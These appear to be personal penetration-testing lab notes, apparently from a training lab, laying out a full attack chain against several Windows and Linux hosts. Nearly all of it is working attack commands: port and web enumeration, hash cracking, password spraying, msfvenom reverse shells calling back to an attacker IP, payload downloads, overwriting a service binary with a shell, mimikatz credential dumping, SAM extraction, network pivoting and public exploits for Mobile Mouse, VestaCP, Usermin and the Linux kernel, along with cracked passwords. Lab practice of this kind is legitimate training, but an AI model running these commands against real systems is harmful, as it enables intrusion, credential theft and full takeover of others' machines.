```
nmap 192.168.220.153 192.168.223.155-157
```

.153
```
nmap -sT -A -p 22,135,139,445,5040,5098,8000 192.168.220.153
nmap -p 1000-10000 192.168.220.153 # 5040, 5098 open
nmap -p 10000-60000 192.168.220.153 # 47001 open, 49664-49671 open
sudo nmap -O 192.168.220.153 --osscan-guess
sudo nmap -sU --open -p 161 192.168.220.153

# enumerate webserver
sudo nmap -sV -p 8000 --script "vuln" 192.168.220.153
nikto -host 192.168.220.153 -port 8000
whatweb http://192.168.220.153:8000
gobuster dir -u http://192.168.220.153:8000 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.220.153:8000
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.220.153:47001
gobuster dir -u http://192.168.220.153:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf

# got some password hashes from /partner/DB
26231162520c611ccabfb18b5ae4dff2 - support:Freedom1
e7966b31d1cad8a83f12ecec236c384c - bcorp
df5fb539ff32f7fde5f3c05d8c8c1a6e - acorp
hashcat -m 0 ecorp.hash /usr/share/wordlists/rockyou.txt

# try password spraying - evilwinrm works
evil-winrm -i 192.168.220.153 -u support -p "Freedom1"
```

.153 privesc
```
iwr -uri http://192.168.45.234/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# cannot start/stop the admintool.exe or watch it
iwr -uri http://192.168.45.234/Watch-Command.ps1 -Outfile Watch-Command.ps1
Import-Module C:\Users\support\Watch-Command.ps1
Get-Process admintool -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30

# try looking for files
Get-ChildItem -Path C:\ -Include *.ps1 -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.kdbx -File -Recurse -ErrorAction SilentlyContinue

x86_64-w64-mingw32-gcc adduser.c -o /home/kali/lab3/adduser.exe
upload adduser.exe
shutdown /r /t 0 
Get-LocalGroupMember administrators

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=9999 -f exe -o shell.exe

# obtain a has from running admintool.exe
# note that we needed an interactive shell to see the bug in the tool
# find this hash: d41d8cd98f00b204e9800998ecf8427e (turns out to be md5)
# password - December31
hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

evil-winrm -i 192.168.220.153 -u Administrator -p "December31"
lsadump::sam sekurlsa::msv lsadump::secrets lsadump::cache

```

.153 post exploitation
```
evil-winrm -i 192.168.220.153 -u Administrator -p "December31"
# get a better shell
upload shell.exe
sekurlsa::logonpasswords
token::elevate
lsadump::sam 
lsadump::cache
lsadump::secrets

# mary.williams - 9a3121977ee93af56ebd0ef4f527a35e
hashcat -m 1000 mary.williams.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# look for SAM files
%SYSTEMROOT%\repair\SAM  
%SYSTEMROOT%\System32\config\RegBack\SAM  
%SYSTEMROOT%\System32\config\SAM  
%SYSTEMROOT%\repair\system  
%SYSTEMROOT%\System32\config\SYSTEM  
%SYSTEMROOT%\System32\config\RegBack\system  

# found in %SYSTEMROOT%\System32\config\SAM  
# cannot extract hashes however
cd C:\Windows\System32\config
download SAM
download SYSTEM
reg save hklm\sam C:\Users\Administrator\sam
reg save hklm\system C:\Users\Administrator\system
pypykatz registry --sam sam system
impacket-secretsdump -sam sam -system system

# look in command history - find a password we can use to password spray
(Get-PSReadlineOption).HistorySavePath
hghgib6vHT3bVWf

# check out domain info
upload SharpHound.ps1
iwr -uri http://192.168.45.234/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -LDAPUser support -LDAPPAss Freedom1 -CollectionMethod All -OutputDirectory C:\users\administrator

```

enumerate internal network
```
# from kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# from proxy on kali
>> session
>> start

# add route to internal network
sudo ip route add 10.10.110.0/24 dev ligolo

# from windows target
upload agent.exe
./agent.exe -ignore-cert -connect 192.168.45.234:11601

```

.154
```
nmap -Pn 10.10.110.154
sudo nmap -sU --open -p 161 -Pn 10.10.110.154

# local auth allows you to use local accounts rather than domain creds
crackmapexec smb 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth
crackmapexec winrm 10.10.110.154 -u users.txt -p passwords.txt --continue-on-success --local-auth --local-auth

evil-winrm -i 10.10.110.154 -u administrator -p hghgib6vHT3bVWf
```

.155
```
nmap 192.168.230.155
nmap -sT -A -p 9099 -Pn 192.168.230.155
nmap -sT -A -p 9999 -Pn 192.168.230.155
nmap -sT -A -p 80,9099,9999,35913 -Pn 192.168.230.155
sudo nmap -O 192.168.230.155 --osscan-guess
# snmp also open
sudo nmap -sU --open -p 161 192.168.230.155

# enumerate webserver
sudo nmap -sV -p 80 --script "vuln" 192.168.230.155
nikto -host 192.168.230.155 -port 80
whatweb http://192.168.230.155
gobuster dir -u http://192.168.230.155 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.230.155

# initial vector
# search for port 9099, find that it's mouse server and find exploit
# another version of exploit: https://github.com/blue0x1/mobilemouse-exploit
searchsploit -m 51010

# modify exploit, serve up shell and run
python3 51010.py --target 192.168.230.155 --file shell.exe --lhost 192.168.45.234

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=1234 -f exe -o shell.exe
```

.155 privesc
```
iwr -uri http://192.168.45.234/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# looking around at the programs I find that we can modify some exe in MilleGPG5 - so I google for it and find this - https://www.exploit-db.com/exploits/50558. We can modify multiple exe then shutdown the system to gain root

cd C:\"Program Files"\MilleGPG5
mv GPGService.exe GPGService.exe.bak
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=9999 -f exe -o shell2.exe

iwr -uri http://192.168.45.234:8080/shell2.exe -Outfile GPGService.exe
shutdown /r /t 0 
```

.156
```
nmap 192.168.230.156
nmap -sT -A -p 8080 -Pn 192.168.230.156

# enumerate webserver
sudo nmap -sV -p 8080 --script "vuln" 192.168.230.156
nikto -host 192.168.230.156 -port 8080
whatweb http://192.168.230.156:8080
gobuster dir -u http://192.168.230.156:8080 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.230.156:8080 --dont-scan /phpmyadmin/*
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.230.156 --dont-scan /phpmyadmin/*
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.230.156:8083 --dont-scan /phpmyadmin/*
gobuster dir -u http://192.168.230.156:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --url http://192.168.230.156:8080 --dont-scan /phpmyadmin/*

# there's a lot going on here
- PHPmyadmin on 8080/phpmyadmin
- VestaCP page on https://192.168.230.156:8083/login with login form - https://www.exploit-db.com/exploits/48294 looks promising but we need creds
- webmail and roundcube directories on 8080

# enumerate ftp
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.230.156

hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.230.156 ftp -s 21

# enumerate snmp
sudo nmap -sU --open -p 161 192.168.230.156
snmp-check 192.168.230.156 -c public
snmpwalk -c public -v1 -t 10 192.168.230.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
# find password jack:3PUKsX98BMupBiCf
```

.156 privesc
```
# we can login to the vesta admin panel with the creds we found, there are a number of exploits against vesta CP
# do some serious googling to find https://github.com/rekter0/exploits/blob/master/VestaCP/vestaROOT.py
wget https://raw.githubusercontent.com/rekter0/exploits/master/VestaCP/VestaFuncs.py
wget https://raw.githubusercontent.com/rekter0/exploits/master/VestaCP/vestaROOT.py

python3 vestaROOT.py https://192.168.230.156:8083 Jack 3PUKsX98BMupBiCf
```

.157
```
nmap 192.168.240.157
nmap -sT -A -p 21,22,80,20000 -Pn 192.168.230.157

# enumerate webserver
sudo nmap -sV -p 8080 --script "vuln" 192.168.230.157
nikto -host 192.168.230.157 -port 80
whatweb http://192.168.230.157:80

# enumerate ftp
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.230.157
# login anonymous and download some files
exiftool NEWSLETTER-TEMPLATE.pdf 
# find users Mark, Robert, Cassie
# test out user:user on different things
ftp cassie@192.168.230.157 # works with password cassie
# cassie:cassie also works on the admin portal at port 20000

# because we can login we can do an authenticated exploit (we found this exploit from nmap fingerprinting of port 20000 - Usermin 1.820)
https://www.exploit-db.com/exploits/50234
searchsploit -m 50234
# modify file to set our kali IP and port
python3 50234.py --host 192.168.240.157 --login cassie --password cassie
nc -nvlp 1234
```

.157 privesc
```
# looks like it's vulnerable to dirty pipe based on kernel version - this is not working though
# create exploit files and copy to container root 
wget https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
sudo su -
cd /home/kali/lab3
cp exp.c /var/lib/machines/xen-test/root/

cd /var/lib/machines/xen-test/root
sudo systemd-nspawn -M xen-test

# compile exploit in container
gcc exp.c -o exp -l mnl -l nftnl -w

# copy back to lab folder
cp exp /home/kali/lab3/

# from target
wget http://192.168.45.234/exp

# try linpeas
wget http://192.168.45.234/linpeas.sh -O linpeas.sh

# findings
.sudo_as_admin_successful in /home/cassie
look in /opt (/opt/admin is writable)
/var/log/vsftpd.log 
/usr/bin/write.ul (Unknown SGID binary)
ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304) 
/var/log/apache2/access.log 

wget http://192.168.45.234/sudo.sh -O sudo.sh
wget http://192.168.45.234/pspy64 -O pspy
```